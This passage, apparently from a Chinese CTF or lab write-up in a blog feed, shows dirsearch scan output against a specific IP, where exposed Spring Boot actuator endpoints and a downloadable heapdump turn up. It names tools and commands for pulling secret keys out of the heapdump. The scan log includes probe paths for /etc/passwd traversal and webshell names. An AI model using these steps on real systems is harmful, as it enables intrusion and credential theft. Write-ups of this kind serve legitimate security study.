class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">└─$ dirsearch -u http://39.106.16.204:61457/</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/http_39.106.16.204_61457/__25-05-22_00-39-07.txt</span><br><span class="line"></span><br><span class="line">Target: http://39.106.16.204:61457/</span><br><span class="line"></span><br><span class="line">[00:39:07] Starting: </span><br><span class="line">[00:39:14] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           </span><br><span class="line">[00:39:14] 404 -   96B  - /;/login                                          </span><br><span class="line">[00:39:15] 400 -  435B  - /a%5c.aspx                                        </span><br><span class="line">[00:39:15] 404 -  111B  - /actuator/;/auditevents                           </span><br><span class="line">[00:39:15] 404 -  105B  - /actuator/;/beans</span><br><span class="line">[00:39:15] 404 -  108B  - /actuator/;/auditLog</span><br><span class="line">[00:39:15] 404 -  110B  - /actuator/;/conditions</span><br><span class="line">[00:39:15] 200 -    2KB - /actuator</span><br><span class="line">[00:39:15] 404 -  106B  - /actuator/;/caches</span><br><span class="line">[00:39:15] 404 -  111B  - /actuator/;/configprops</span><br><span class="line">[00:39:15] 404 -  121B  - /actuator/;/configurationMetadata</span><br><span class="line">[00:39:15] 404 -  104B  - /actuator/;/dump</span><br><span class="line">[00:39:15] 404 -  108B  - /actuator/;/features</span><br><span class="line">[00:39:15] 404 -  106B  - /actuator/;/health</span><br><span class="line">[00:39:15] 404 -  111B  - /actuator/;/healthcheck</span><br><span class="line">[00:39:15] 404 -  124B  - /actuator/;/exportRegisteredServices</span><br><span class="line">[00:39:15] 404 -  106B  - /actuator/;/flyway</span><br><span class="line">[00:39:15] 404 -  103B  - /actuator/;/env</span><br><span class="line">[00:39:15] 404 -  106B  - /actuator/;/events</span><br><span class="line">[00:39:15] 404 -  108B  - /actuator/;/heapdump</span><br><span class="line">[00:39:15] 404 -  109B  - /actuator/;/httptrace</span><br><span class="line">[00:39:15] 404 -  104B  - /actuator/;/info</span><br><span class="line">[00:39:15] 404 -  107B  - /actuator/;/jolokia</span><br><span class="line">[00:39:15] 404 -  107B  - /actuator/;/logfile</span><br><span class="line">[00:39:15] 404 -  116B  - /actuator/;/integrationgraph</span><br><span class="line">[00:39:15] 404 -  109B  - /actuator/;/liquibase</span><br><span class="line">[00:39:15] 404 -  108B  - /actuator/;/mappings</span><br><span class="line">[00:39:15] 404 -  113B  - /actuator/;/loggingConfig</span><br><span class="line">[00:39:15] 404 -  107B  - /actuator/;/refresh</span><br><span class="line">[00:39:15] 404 -  117B  - /actuator/;/releaseAttributes</span><br><span class="line">[00:39:15] 404 -  107B  - /actuator/;/loggers</span><br><span class="line">[00:39:15] 404 -  107B  - /actuator/;/metrics</span><br><span class="line">[00:39:15] 404 -  110B  - /actuator/;/prometheus</span><br><span class="line">[00:39:15] 404 -  118B  - /actuator/;/registeredServices</span><br><span class="line">[00:39:16] 404 -  113B  - /actuator/;/springWebflow</span><br><span class="line">[00:39:16] 404 -  103B  - /actuator/;/sso</span><br><span class="line">[00:39:16] 404 -  110B  - /actuator/;/statistics</span><br><span class="line">[00:39:16] 404 -  102B  - /actuator/dump</span><br><span class="line">[00:39:16] 404 -  108B  - /actuator/;/sessions</span><br><span class="line">[00:39:16] 404 -  110B  - /actuator/;/threaddump</span><br><span class="line">[00:39:16] 404 -  117B  - /actuator/;/resolveAttributes</span><br><span class="line">[00:39:16] 404 -  114B  - /actuator/;/scheduledtasks</span><br><span class="line">[00:39:16] 404 -  106B  - /actuator/;/status</span><br><span class="line">[00:39:16] 404 -  108B  - /actuator/;/shutdown</span><br><span class="line">[00:39:16] 404 -  119B  - /actuator/configurationMetadata</span><br><span class="line">[00:39:16] 404 -  109B  - /actuator/auditevents</span><br><span class="line">[00:39:16] 404 -  111B  - /actuator/;/ssoSessions</span><br><span class="line">[00:39:16] 404 -  104B  - /actuator/events</span><br><span class="line">[00:39:16] 404 -  106B  - /actuator/auditLog</span><br><span class="line">[00:39:16] 404 -  122B  - /actuator/exportRegisteredServices</span><br><span class="line">[00:39:16] 404 -  105B  - /actuator/;/trace</span><br><span class="line">[00:39:16] 404 -  107B  - /actuator/httptrace</span><br><span class="line">[00:39:16] 404 -  104B  - /actuator/flyway</span><br><span class="line">[00:39:16] 404 -  114B  - /actuator/integrationgraph</span><br><span class="line">[00:39:16] 404 -  112B  - /actuator/gateway/routes</span><br><span class="line">[00:39:16] 404 -  109B  - /actuator/healthcheck</span><br><span class="line">[00:39:16] 200 -   20B  - /actuator/caches</span><br><span class="line">[00:39:16] 404 -  105B  - /actuator/jolokia</span><br><span class="line">[00:39:16] 404 -  106B  - /actuator/features</span><br><span class="line">[00:39:16] 404 -  105B  - /actuator/logfile</span><br><span class="line">[00:39:16] 404 -  107B  - /actuator/liquibase</span><br><span class="line">[00:39:16] 200 -    2B  - /actuator/info</span><br><span class="line">[00:39:16] 404 -  115B  - /actuator/resolveAttributes</span><br><span class="line">[00:39:16] 404 -  111B  - /actuator/loggingConfig</span><br><span class="line">[00:39:16] 404 -  105B  - /actuator/refresh</span><br><span class="line">[00:39:16] 404 -  106B  - /actuator/shutdown</span><br><span class="line">[00:39:16] 404 -  106B  - /actuator/sessions</span><br><span class="line">[00:39:16] 404 -  116B  - /actuator/registeredServices</span><br><span class="line">[00:39:16] 404 -  108B  - /actuator/prometheus</span><br><span class="line">[00:39:16] 404 -  115B  - /actuator/releaseAttributes</span><br><span class="line">[00:39:16] 404 -  108B  - /actuator/management</span><br><span class="line">[00:39:16] 404 -  111B  - /actuator/springWebflow</span><br><span class="line">[00:39:16] 200 -    8KB - /actuator/env</span><br><span class="line">[00:39:16] 404 -  104B  - /actuator/status</span><br><span class="line">[00:39:16] 200 - 1018B  - /actuator/metrics</span><br><span class="line">[00:39:16] 200 -   93KB - /actuator/beans</span><br><span class="line">[00:39:16] 404 -  108B  - /actuator/statistics                              </span><br><span class="line">[00:39:16] 404 -  103B  - /actuator/trace                                   </span><br><span class="line">[00:39:16] 404 -  101B  - /actuator/sso                                     </span><br><span class="line">[00:39:16] 404 -  109B  - /actuator/ssoSessions</span><br><span class="line">[00:39:16] 404 -  112B  - /actuator/hystrix.stream</span><br><span class="line">[00:39:16] 200 -   54B  - /actuator/scheduledtasks                          </span><br><span class="line">[00:39:16] 200 -   49KB - /actuator/loggers                                 </span><br><span class="line">[00:39:17] 200 -   22KB - /actuator/mappings                                </span><br><span class="line">[00:39:17] 200 -  268B  - /actuator/health</span><br><span class="line">[00:39:17] 200 -   99KB - /actuator/conditions                              </span><br><span class="line">[00:39:17] 200 -  197KB - /actuator/threaddump                              </span><br><span class="line">[00:39:17] 200 -   33MB - /actuator/heapdump                                </span><br><span class="line">[00:39:18] 200 -   14KB - /actuator/configprops                             </span><br><span class="line">[00:39:32] 404 -  102B  - /images/README                                    </span><br><span class="line">[00:39:32] 404 -  103B  - /images/c99.php                                   </span><br><span class="line">[00:39:32] 404 -  103B  - /images/Sym.php                                   </span><br><span class="line">[00:39:35] 200 -   11KB - /login                                            </span><br><span class="line">[00:39:35] 200 -   11KB - /login/ </span><br></pre></td></tr></table></figure><p>heapdump泄露，先把东西下载下来，随便找个工具来处理，不要strings当原始人 </p><p><a href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p><p><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a>  但是第一个工具并没有成功</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar heapdump_tools.jar C:\Users\baozhongqi\Desktop\heapdump2</span><br><span class="line"></span><br><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump2</span><br></pre></td></tr></table></figure><p>拿到密钥之后用工具一把锁即可，如果不成功的多点点，随便乱按都能出，除非工具错了</p>]]></content>
    
    
    <summary type="html">。。。</summary>
    
    
    
    
  </entry>
  
</feed>
